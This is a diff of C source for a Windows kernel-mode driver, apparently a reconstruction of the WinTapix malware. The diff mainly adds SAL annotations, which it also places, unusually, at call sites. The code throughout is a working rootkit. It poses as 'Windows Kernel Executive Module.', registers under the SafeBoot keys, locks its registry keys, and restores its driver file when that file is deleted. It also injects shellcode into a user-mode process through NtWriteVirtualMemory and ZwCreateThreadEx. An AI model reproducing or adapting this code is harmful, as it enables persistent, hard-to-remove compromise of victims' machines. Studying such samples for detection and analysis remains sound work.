@@ -16,7 +16,7 @@ Copyright (c) Fluxuss Software Security, LLC
 
 __int64 query_file_information_get_file_size(
     
-    const WCHAR* wchFileName
+    _In_ const WCHAR* wchFileName
 
 ) {
     
@@ -28,8 +28,8 @@ __int64 query_file_information_get_file_size(
 
     RtlInitUnicodeString(
         
-        &uniStrStore, 
-        wchFileName
+        _Out_ &uniStrStore,
+        _In_opt_ wchFileName
     
     );
 
@@ -44,42 +44,42 @@ __int64 query_file_information_get_file_size(
 
     if ( NT_SUCCESS( ZwCreateFile(
         
-        &hFile, 
-        0x80000000, 
-        &ObjectAttributes, 
-        &IoStatusBlock, 
-        0i64, 
-        0x80u, 
-        1u,
-        1u,
-        0x20u,
-        0i64,
-        0
+        _Out_ &hFile,
+        _In_ 0x80000000,
+        _In_ &ObjectAttributes,
+        _Out_ &IoStatusBlock,
+        _In_opt_ 0i64,
+        _In_ 0x80u,
+        _In_ 1u,
+        _In_ 1u,
+        _In_ 0x20u,
+        _In_ 0i64,
+        _In_ 0
     
     ) ) ) {
 
         memset(
             
-            &IoStatusBlock, 
-            0, 
-            sizeof( IoStatusBlock )
+            _Out_ &IoStatusBlock, 
+            _In_ 0, 
+            _In_ sizeof( IoStatusBlock )
         
         );
         
         if ( NT_SUCCESS( ZwQueryInformationFile( 
             
-            hFile, 
-            &IoStatusBlock, 
-            &FileInformation, 
-            0x18u,
-            FileStandardInformation
+            _In_ hFile,
+            _Out_ &IoStatusBlock, 
+            _Out_ &FileInformation,
+            _In_ 0x18u,
+            _In_ FileStandardInformation
         
         ) ) )
             sizeFile = FileInformation.EndOfFile.QuadPart;
         
         ZwClose(
             
-            hFile
+            _In_ hFile
         
         );
     }
@@ -89,9 +89,9 @@ __int64 query_file_information_get_file_size(
 
 NTSTATUS wrap_read_file(
     
-    const WCHAR* wchFileName,
-    PVOID* pBuffer,
-    SIZE_T* szBuffer
+    _In_ const WCHAR* wchFileName,
+    _In_ PVOID* pBuffer,
+    _In_ SIZE_T* szBuffer
 
 ) {
 
@@ -104,28 +104,26 @@ NTSTATUS wrap_read_file(
 
     *szBuffer = query_file_information_get_file_size(
         
-        wchFileName
+        _In_ wchFileName
     
     );
 
-    if ( *szBuffer == 0xFFFFFFFFFFFFFFFF )
-        return STATUS_FILE_INVALID;
+    if ( *szBuffer == 0xFFFFFFFFFFFFFFFF ) return STATUS_FILE_INVALID;
 
     *pBuffer = ExAllocatePoolWithTag( 
         
-        NonPagedPool,
-        *szBuffer,
-        'MAL'
+        _In_ NonPagedPool,
+        _In_ *szBuffer,
+        _In_ 'MAL'
     
     );
 
-    if ( !*pBuffer )
-        return STATUS_ADDRESS_NOT_ASSOCIATED;
+    if ( !*pBuffer ) return STATUS_ADDRESS_NOT_ASSOCIATED;
 
     RtlInitUnicodeString(
         
-        &uniStrDestination,
-        wchFileName
+        _Out_ &uniStrDestination,
+        _In_ wchFileName
     
     );
 
@@ -138,17 +136,17 @@ NTSTATUS wrap_read_file(
 
     NTSTATUS status = ZwCreateFile(
         
-        &hFile,
-        0x80000000,
-        &ObjectAttributes,
-        &IoStatusBlock,
-        0i64,
-        0x80u,
-        1u,
-        1u,
-        0x20u,
-        0i64,
-        0
+        _Out_ &hFile,
+        _In_ 0x80000000,
+        _In_ &ObjectAttributes,
+        _Out_ &IoStatusBlock,
+        _In_ 0i64,
+        _In_ 0x80u,
+        _In_ 1u,
+        _In_ 1u,
+        _In_ 0x20u,
+        _In_ 0i64,
+        _In_ 0
     
     );
 
@@ -158,15 +156,15 @@ NTSTATUS wrap_read_file(
 
         return ZwReadFile(
             
-            hFile,
-            0i64,
-            0i64,
-            0i64,
-            &IoStatusBlock,
-            *pBuffer,
-            (ULONG)*szBuffer,
-            &ByteOffset,
-            0i64
+            _In_ hFile,
+            _In_ 0i64,
+            _In_ 0i64,
+            _In_ 0i64,
+            _Out_ &IoStatusBlock,
+            _Out_ *pBuffer,
+            _In_ (ULONG)*szBuffer,
+            _In_ &ByteOffset,
+            _In_ 0i64
         
         );
     }
@@ -176,7 +174,7 @@ NTSTATUS wrap_read_file(
 
 NTSTATUS create_kernel_mode_file(
     
-    const WCHAR* wchWintapixPath
+    _In_ const WCHAR* wchWintapixPath
 
 ) {
 
@@ -187,16 +185,16 @@ NTSTATUS create_kernel_mode_file(
 
     memset(
         
-        &IoStatusBlock,
-        0,
-        sizeof( IoStatusBlock )
+        _Out_ &IoStatusBlock,
+        _In_ 0,
+        _In_ sizeof( IoStatusBlock )
     
     );
 
     RtlInitUnicodeString(
         
-        &uniStrPath,
-        wchWintapixPath
+        _Out_ &uniStrPath,
+        _In_ wchWintapixPath
     
     );
     
@@ -209,26 +207,26 @@ NTSTATUS create_kernel_mode_file(
 
     return ZwCreateFile(
         
-        &hFile,
-        0x10000000u,
-        &ObjectAttributes,
-        &IoStatusBlock,
-        0i64,
-        0x80u,
-        0,
-        1u,
-        0x20u,
-        0i64,
-        0
+        _Out_ &hFile,
+        _In_ 0x10000000u,
+        _In_ &ObjectAttributes,
+        _Out_ &IoStatusBlock,
+        _In_opt_ 0i64,
+        _In_ 0x80u,
+        _In_ 0,
+        _In_ 1u,
+        _In_ 0x20u,
+        _In_ 0i64,
+        _In_ 0
     
     );
 }
 
 NTSTATUS wrap_persistence_thread_main(
     
-    const WCHAR* wchWintapixPath,
-    const WCHAR* wchWintapixPath2,
-    const WCHAR* wchWintapixName
+    _In_ const WCHAR* wchWintapixPath,
+    _In_ const WCHAR* wchWintapixPath2,
+    _In_ const WCHAR* wchWintapixName
 
 ) {
 
@@ -241,22 +239,21 @@ NTSTATUS wrap_persistence_thread_main(
 
     NtNotifyChangeDirectoryFile = ( _NtNotifyChangeDirectoryFile ) GetFunctionAddress(
         
-        "NtNotifyChangeDirectoryFile"
+        _In_ "NtNotifyChangeDirectoryFile"
     
     );
 
     if ( !MmIsAddressValid( 
         
-        &NtNotifyChangeDirectoryFile
+        _In_ &NtNotifyChangeDirectoryFile
     
-    ) )
-        return STATUS_ADDRESS_NOT_ASSOCIATED;
+    ) ) return STATUS_ADDRESS_NOT_ASSOCIATED;
 
     NTSTATUS status = wrap_read_file(
         
-        wchWintapixPath,
-        &pBuffer,
-        &szBuffer
+        _In_ wchWintapixPath,
+        _In_ &pBuffer,
+        _In_ &szBuffer
     
     );
 
@@ -264,14 +261,14 @@ NTSTATUS wrap_persistence_thread_main(
 
         create_kernel_mode_file(
             
-            wchWintapixPath
+            _In_ wchWintapixPath
         
         );
 
         RtlInitUnicodeString(
             
-            &uniStrWintaPixPath,
-            wchWintapixPath2
+            _Out_ &uniStrWintaPixPath,
+            _In_ wchWintapixPath2
         
         );
 
@@ -284,17 +281,17 @@ NTSTATUS wrap_persistence_thread_main(
 
         status = ZwCreateFile(
             
-            &hFile, 
-            0x100001u, 
-            &ObjectAttributes, 
-            &IoStatusBlock, 
-            0i64, 
-            0x4000u, 
-            7u, 
-            1u, 
-            0x21u, 
-            0i64, 
-            0
+            _Out_ &hFile,
+            _In_ 0x100001u,
+            _In_ &ObjectAttributes,
+            _Out_ &IoStatusBlock,
+            _In_ 0i64,
+            _In_ 0x4000u,
+            _In_ 7u,
+            _In_ 1u,
+            _In_ 0x21u,
+            _In_ 0i64,
+            _In_ 0
         
         );
 
@@ -304,9 +301,9 @@ NTSTATUS wrap_persistence_thread_main(
             
             memset(
                 
-                &ObjectAttributes.RootDirectory,
-                0,
-                20
+                _Out_ &ObjectAttributes.RootDirectory,
+                _In_ 0,
+                _In_ 20
             
             );
             
@@ -315,11 +312,11 @@ NTSTATUS wrap_persistence_thread_main(
 
             ZwCreateEvent(
                 
-                &hEvent, 
-                0x1F0003u, 
-                &ObjectAttributes, 
-                NotificationEvent, 
-                0
+                _Out_ &hEvent,
+                _In_ 0x1F0003u,
+                _In_ &ObjectAttributes,
+                _In_ NotificationEvent,
+                _In_ 0
             
             );
 
@@ -327,9 +324,9 @@ NTSTATUS wrap_persistence_thread_main(
 
             FILE_NOTIFY_INFORMATION* fInfo = ( FILE_NOTIFY_INFORMATION* ) ExAllocatePoolWithTag( 
                 
-                NonPagedPool,
-                0x10000ui64,
-                'mall'
+                _In_ NonPagedPool,
+                _In_ 0x10000ui64,
+                _In_ 'mall'
             
             );
 
@@ -337,29 +334,29 @@ NTSTATUS wrap_persistence_thread_main(
 
                 if ( NtNotifyChangeDirectoryFile( 
                     
-                    hFile, 
-                    hEvent, 
-                    NULL, 
-                    NULL, 
-                    &IoStatusBlock, 
-                    fInfo, 
-                    NumberOfBytes, 
-                    4095, 
-                    TRUE 
+                    _In_ hFile,
+                    _In_ hEvent,
+                    _In_ NULL,
+                    _In_ NULL,
+                    _Out_ &IoStatusBlock,
+                    _Out_ fInfo,
+                    _In_ NumberOfBytes,
+                    _In_ 4095,
+                    _In_ TRUE
                 
                 ) == STATUS_PENDING )
                     ZwWaitForSingleObject(
                         
-                        hEvent,
-                        1u,
-                        0i64
+                        _In_ hEvent,
+                        _In_ 1u,
+                        _In_ 0i64
                     
                     );
                 
                 ZwSetEvent(
                     
-                    hEvent,
-                    0i64
+                    _In_ hEvent,
+                    _Out_ 0i64
                 
                 );
 
@@ -367,38 +364,38 @@ NTSTATUS wrap_persistence_thread_main(
 
                     DbgPrintEx(
                         
-                        0,
-                        0,
-                        "File changed: %ls",
+                        _In_ 0,
+                        _In_ 0,
+                        _In_ "File changed: %ls",
                         fInfo->FileName
                     
                     );
 
                     if ( compare_unicode_string_2(
                         
-                        wchWintapixName, 
-                        fInfo->FileName, 
-                        fInfo->FileNameLength
+                        _In_ wchWintapixName,
+                        _In_ fInfo->FileName,
+                        _In_ fInfo->FileNameLength
                     
                     ) ) {
 
                         delete_file(
                             
-                            wchWintapixPath
+                            _In_ wchWintapixPath
                         
                         );
 
                         override_file_with_buffer(
                             
-                            wchWintapixPath,
-                            pBuffer,
-                            (ULONG)szBuffer
+                            _In_ wchWintapixPath,
+                            _In_ pBuffer,
+                            _In_ (ULONG)szBuffer
                         
                         );
                         
                         create_kernel_mode_file(
                             
-                            wchWintapixPath
+                            _In_ wchWintapixPath
                         
                         );
 
@@ -419,7 +416,7 @@ NTSTATUS wrap_persistence_thread_main(
 
 void persistence_thread(
     
-    PVOID StartContext
+    _In_ PVOID StartContext
 
 ) {
 
@@ -427,9 +424,9 @@ void persistence_thread(
 
     wrap_persistence_thread_main(
         
-        L"\\systemroot\\system32\\drivers\\WinTapix.sys",
-        L"\\systemroot\\system32\\drivers\\",
-        L"WinTapix.sys"
+        _In_ L"\\systemroot\\system32\\drivers\\WinTapix.sys",
+        _In_ L"\\systemroot\\system32\\drivers\\",
+        _In_ L"WinTapix.sys"
     
     );
 
@@ -437,7 +434,7 @@ void persistence_thread(
 
 NTSTATUS notify_registry_key_change(
     
-    const WCHAR* wchWintapixRegisty
+    _In_ const WCHAR* wchWintapixRegisty
 
 ) {
 
@@ -446,8 +443,8 @@ NTSTATUS notify_registry_key_change(
 
     RtlInitUnicodeString(
         
-        &uniStrDest,
-        wchWintapixRegisty
+        _Out_ &uniStrDest,
+        _In_ wchWintapixRegisty
     
     );
 
@@ -461,9 +458,9 @@ NTSTATUS notify_registry_key_change(
     HANDLE hKey;
     NTSTATUS status = ZwOpenKey(
         
-        &hKey,
-        0xF003Fu,
-        &ObjectAttributes
+        _Out_ &hKey,
+        _In_ 0xF003Fu,
+        _In_ &ObjectAttributes
     
     );
     
@@ -478,29 +475,29 @@ NTSTATUS notify_registry_key_change(
         
         status = ZwCreateKey(
             
-            &hKey,
-            0xF003Fu,
-            &ObjectAttributes,
-            0,
-            0i64,
-            0,
-            0i64
+            _Out_ &hKey,
+            _In_ 0xF003Fu,
+            _In_ &ObjectAttributes,
+            _In_ 0,
+            _In_ 0i64,
+            _In_ 0,
+            _Out_ 0i64
         
         );
     }
 
     if ( NT_SUCCESS( status ) ) return ZwNotifyChangeKey(
         
-        hKey,
-        0i64,
-        NULL,
-        (PVOID)1,
-        &g_IoStatusBlock,
-        5u,
-        1u,
-        0i64,
-        0,
-        1u
+        _In_ hKey,
+        _In_ 0i64,
+        _In_ NULL,
+        _In_ (PVOID)1,
+        _Out_ &g_IoStatusBlock,
+        _In_ 5u,
+        _In_ 1u,
+        _Out_ 0i64,
+        _In_ 0,
+        _In_ 1u
     
     );
 
@@ -509,7 +506,7 @@ NTSTATUS notify_registry_key_change(
 
 NTSTATUS Lock_Registy_Key(
     
-    const WCHAR* wchRegistyKey
+    _In_ const WCHAR* wchRegistyKey
 
 ) {
 
@@ -520,21 +517,21 @@ NTSTATUS Lock_Registy_Key(
 
     NtLockRegistryKey = ( _NtLockRegistryKey )GetFunctionAddress(
         
-        "NtLockRegistryKey"
+        _In_ "NtLockRegistryKey"
     
     );
 
     if ( !MmIsAddressValid(
         
-        &NtLockRegistryKey
+        _In_ &NtLockRegistryKey
     
     ) )
         return STATUS_ADDRESS_NOT_ASSOCIATED;
 
     RtlInitUnicodeString(
         
-        &uStrRegistyService, 
-        wchRegistyKey
+        _Out_ &uStrRegistyService,
+        _In_ wchRegistyKey
     
     );
 
@@ -547,16 +544,16 @@ NTSTATUS Lock_Registy_Key(
 
     NTSTATUS status = ZwOpenKey(
         
-        &hKey,
-        0x20019u,
-        &ObjectAttributes
+        _Out_ &hKey,
+        _In_ 0x20019u,
+        _In_ &ObjectAttributes
     
     );
 
     if ( NT_SUCCESS( status ) )
         return NtLockRegistryKey(
             
-            hKey
+            _In_ hKey
         
         );
     
@@ -565,9 +562,9 @@ NTSTATUS Lock_Registy_Key(
 
 NTSTATUS set_registry_key_value_2(
     
-    void* handle, 
-    const WCHAR* key, 
-    int value
+    _In_ void* handle, 
+    _In_ const WCHAR* key,
+    _In_ int value
 
 ) {
 
@@ -575,28 +572,28 @@ NTSTATUS set_registry_key_value_2(
 
     RtlInitUnicodeString(
         
-        &uniStrValue, 
-        key
+        _Out_ &uniStrValue,
+        _In_ key
     
     );
 
     return ZwSetValueKey(
         
-        handle, 
-        &uniStrValue, 
-        0, 
-        4, 
-        (PVOID)value, 
-        4
+        _In_ handle,
+        _In_ &uniStrValue,
+        _In_ 0,
+        _In_ 4,
+        _In_ (PVOID)value,
+        _In_ 4
     
     );
 }
 
 NTSTATUS set_registry_key_value(
     
-    void* handle,
-    const WCHAR* key,
-    void* value
+    _In_ void* handle,
+    _In_ const WCHAR* key,
+    _In_ void* value
 
 ) {
 
@@ -605,16 +602,16 @@ NTSTATUS set_registry_key_value(
 
     RtlStringCchLengthW(
         
-        value,
-        0x7FFFFFFF,
-        &szLength
+        _In_ value,
+        _In_ 0x7FFFFFFF,
+        _Out_ &szLength
     
     );
 
     RtlInitUnicodeString(
         
-        &uniStrKey,
-        key
+        _Out_ &uniStrKey,
+        _In_ key
     
     );
 
@@ -622,19 +619,19 @@ NTSTATUS set_registry_key_value(
 
     return ZwSetValueKey(
         
-        handle,
-        &uniStrKey,
-        0,
-        1,
-        value,
-        2 * szValue + 2
+        _In_ handle,
+        _In_ &uniStrKey,
+        _In_ 0,
+        _In_ 1,
+        _In_ value,
+        _In_ 2 * szValue + 2
     
     );
 }
 
 NTSTATUS garant_driver_run(
     
-    const WCHAR* wchRegistyKey
+    _In_ const WCHAR* wchRegistyKey
 
 ) {
 
@@ -644,8 +641,8 @@ NTSTATUS garant_driver_run(
 
     RtlInitUnicodeString(
         
-        &uniStrRegistyKey,
-        wchRegistyKey
+        _Out_ &uniStrRegistyKey,
+        _In_ wchRegistyKey
     
     );
 
@@ -658,9 +655,9 @@ NTSTATUS garant_driver_run(
     
     NTSTATUS status = ZwOpenKey(
         
-        &hKey,
-        0xF003Fu,
-        &ObjectAttributes
+        _Out_ &hKey,
+        _In_ 0xF003Fu,
+        _In_ &ObjectAttributes
     
     );
 
@@ -676,13 +673,13 @@ NTSTATUS garant_driver_run(
         
         status = ZwCreateKey(
             
-            &hKey,
-            0xF003Fu,
-            &ObjectAttributes,
-            0,
-            0i64,
-            0,
-            0i64
+            _Out_ &hKey,
+            _In_ 0xF003Fu,
+            _In_ &ObjectAttributes,
+            _In_ 0,
+            _In_ 0i64,
+            _In_ 0,
+            _Out_ 0i64
         
         );
     }
@@ -691,64 +688,64 @@ NTSTATUS garant_driver_run(
 
         set_registry_key_value(
             
-            hKey,
-            L"DisplayName",
-            L"WinTapix Driver"
+            _In_ hKey,
+            _In_ L"DisplayName",
+            _In_ L"WinTapix Driver"
         
         );
 
         set_registry_key_value_2(
             
-            hKey,
-            L"ErrorControl",
-            TRUE
+            _In_ hKey,
+            _In_ L"ErrorControl",
+            _In_ TRUE
         
         );
         
         set_registry_key_value(
             
-            hKey,
-            L"ImagePath",
-            L"\\SystemRoot\\System32\\drivers\\WinTapix.sys"
+            _In_ hKey,
+            _In_ L"ImagePath",
+            _In_ L"\\SystemRoot\\System32\\drivers\\WinTapix.sys"
         
         );
         
         set_registry_key_value(
             
-            hKey,
-            L"Description",
-            L"Windows Kernel Executive Module."
+            _In_ hKey,
+            _In_ L"Description",
+            _In_ L"Windows Kernel Executive Module."
         
         );
         
         set_registry_key_value_2(
             
-            hKey,
-            L"Start",
-            TRUE
+            _In_ hKey,
+            _In_ L"Start",
+            _In_ TRUE
         
         );
         
         set_registry_key_value_2(
             
-            hKey,
-            L"Type",
-            TRUE
+            _In_ hKey,
+            _In_ L"Type",
+            _In_ TRUE
         
         );
 
         return ZwNotifyChangeKey(
             
-            hKey,
-            0i64, 
-            NULL, 
-            (PVOID)1, 
-            &g_IoStatusBlock, 
-            5u, 
-            1u, 
-            0i64, 
-            0, 
-            1u
+            _In_ hKey,
+            _In_ 0i64,
+            _In_ NULL,
+            _In_ (PVOID)1,
+            _Out_ &g_IoStatusBlock, 
+            _In_ 5u,
+            _In_ 1u,
+            _Out_ 0i64, 
+            _In_ 0,
+            _In_ 1u
         
         );
 
@@ -770,14 +767,14 @@ NTSTATUS persistence_stuff_main(
 
     RtlInitUnicodeString(
         
-        &ustrWintapix,
-        L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinTapix"
+        _Out_ &ustrWintapix,
+        _In_ L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinTapix"
     
     );
 
     NTSTATUS status = Lock_Registy_Key(
         
-        ustrWintapix.Buffer
+        _In_ ustrWintapix.Buffer
     
     );
 
@@ -785,19 +782,19 @@ NTSTATUS persistence_stuff_main(
 
         garant_driver_run(
             
-            ustrWintapix.Buffer
+            _In_ ustrWintapix.Buffer
         
         );
 
         status = PsCreateSystemThread(
             
-            &g_hThreadPersist,
-            0,
-            0i64,
-            0i64,
-            0i64,
-            (PKSTART_ROUTINE)persistence_thread,
-            0i64
+            _Out_ &g_hThreadPersist,
+            _In_ 0,
+            _In_ 0i64,
+            _In_ 0i64,
+            _Out_opt_ 0i64,
+            _In_ (PKSTART_ROUTINE)persistence_thread,
+            _In_ 0i64
         
         );
 
@@ -805,52 +802,52 @@ NTSTATUS persistence_stuff_main(
 
             RtlInitUnicodeString(
                 
-                &ustrSecurityService,
-                L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinTapix\\Security"
+                _Out_ &ustrSecurityService,
+                _In_ L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinTapix\\Security"
             
             );
 
             Lock_Registy_Key(
                 
-                ustrSecurityService.Buffer
+                _In_ ustrSecurityService.Buffer
             
             );
 
             RtlInitUnicodeString(
                 
-                &ustrDriverMinimal, 
-                L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinTapix.sys"
+                _Out_ &ustrDriverMinimal,
+                _In_ L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinTapix.sys"
             
             );
 
             notify_registry_key_change(
                 
-                ustrDriverMinimal.Buffer
+                _In_ ustrDriverMinimal.Buffer
             
             );
 
             Lock_Registy_Key(
                 
-                ustrDriverMinimal.Buffer
+                _In_ ustrDriverMinimal.Buffer
             
             );
 
             RtlInitUnicodeString(
                 
-                &ustrWintapixNetworkPersist,
-                L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\WinTapix.sys"
+                _Out_ &ustrWintapixNetworkPersist,
+                _In_ L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\WinTapix.sys"
             
             );
 
             notify_registry_key_change(
                 
-                ustrWintapixNetworkPersist.Buffer
+                _In_ ustrWintapixNetworkPersist.Buffer
             
             );
 
             Lock_Registy_Key(
                 
-                ustrWintapixNetworkPersist.Buffer
+                _In_ ustrWintapixNetworkPersist.Buffer
             
             );
 
@@ -864,7 +861,7 @@ NTSTATUS persistence_stuff_main(
 
 NTSTATUS SetThreadDelay(
     
-    signed int siDelayTime
+    _In_ signed int siDelayTime
 
 ) {
 
@@ -878,15 +875,15 @@ NTSTATUS SetThreadDelay(
 
         return KeDelayExecutionThread(
             
-            KernelMode,
-            TRUE,
-            &laInterval
+            _In_ KernelMode,
+            _In_ TRUE,
+            _In_ &laInterval
         
         ) != 0;
 
     } else KeStallExecutionProcessor(
         
-        siDelayTime
+        _In_ siDelayTime
     
     );
 
@@ -895,7 +892,7 @@ NTSTATUS SetThreadDelay(
 
 void ThreadMalware(
     
-    PVOID StartContext
+    _In_ PVOID StartContext
 
 ) {
 
@@ -909,15 +906,15 @@ void ThreadMalware(
 
             OpenTargetProcess(
                 
-                &process_to_inect
+                _In_ &process_to_inect
             
             );
 
             DbgPrintEx(
                 
-                0, 
-                0, 
-                "PID: %X", 
+                _In_ 0,
+                _In_ 0,
+                _In_ "PID: %X",
                 process_to_inect
             
             );
@@ -926,7 +923,7 @@ void ThreadMalware(
 
             SetThreadDelay( 
             
-                5000000
+                _In_ 5000000
             
             );
 
@@ -934,24 +931,24 @@ void ThreadMalware(
 
         if ( NT_SUCCESS( InjectShellcodeOnUsermodeProcess( 
             
-            process_to_inect,
-            GetFunctionAddress( 
+            _In_ process_to_inect,
+            _In_ GetFunctionAddress(
             
-                "NtWriteVirtualMemory"
+                _In_ "NtWriteVirtualMemory"
             
             ),
-            GetFunctionAddress( 
+            _In_ GetFunctionAddress(
                 
-                "ZwCreateThreadEx"
+                _In_ "ZwCreateThreadEx"
             
             ),
-            g_ucMyShellcode,
-            3072
+            _In_ g_ucMyShellcode,
+            _In_ 3072
         
         ) ) )
             if ( NT_SUCCESS( TerminateUsemodeProcess( 
                 
-                process_to_inect
+                _In_ process_to_inect
             
             ) ) )
                 break;
@@ -962,8 +959,8 @@ void ThreadMalware(
 
 NTSTATUS DriverEntry(
     
-    PDRIVER_OBJECT pDriverObject, 
-    PUNICODE_STRING pRegistryPath
+    _In_ PDRIVER_OBJECT pDriverObject,
+    _In_ PUNICODE_STRING pRegistryPath
 
 ) {
 
@@ -975,9 +972,9 @@ NTSTATUS DriverEntry(
 
     DbgPrintEx(
         
-        0,
-        0,
-        "Hello World !!"
+        _In_ 0,
+        _In_ 0,
+        _In_ "Hello World !!"
     
     );
 
@@ -985,13 +982,13 @@ NTSTATUS DriverEntry(
 
     PsCreateSystemThread( 
         
-        &g_hThread,
-        0,
-        NULL,
-        NULL,
-        NULL,
-        &ThreadMalware,
-        NULL
+        _Out_ &g_hThread,
+        _In_ 0,
+        _In_ NULL,
+        _In_ NULL,
+        _Out_opt_ NULL,
+        _In_ &ThreadMalware,
+        _In_ NULL
     
     );
 
@@ -1000,15 +997,15 @@ NTSTATUS DriverEntry(
 
 VOID UnloadDriver(
     
-    PDRIVER_OBJECT pDriverObject
+    _In_ PDRIVER_OBJECT pDriverObject
 
 ) {
 
     DbgPrintEx(
 
-        0, 
-        0, 
-        "GoodBye, Driver Unload !!"
+        _In_ 0,
+        _In_ 0,
+        _In_ "GoodBye, Driver Unload !!"
     
     );
 
@@ -1016,13 +1013,13 @@ VOID UnloadDriver(
 
     ZwClose(
         
-        g_hThread
+        _In_ g_hThread
     
     );
 
     ZwClose(
         
-        g_hThreadPersist
+        _In_ g_hThreadPersist
     
     );
 
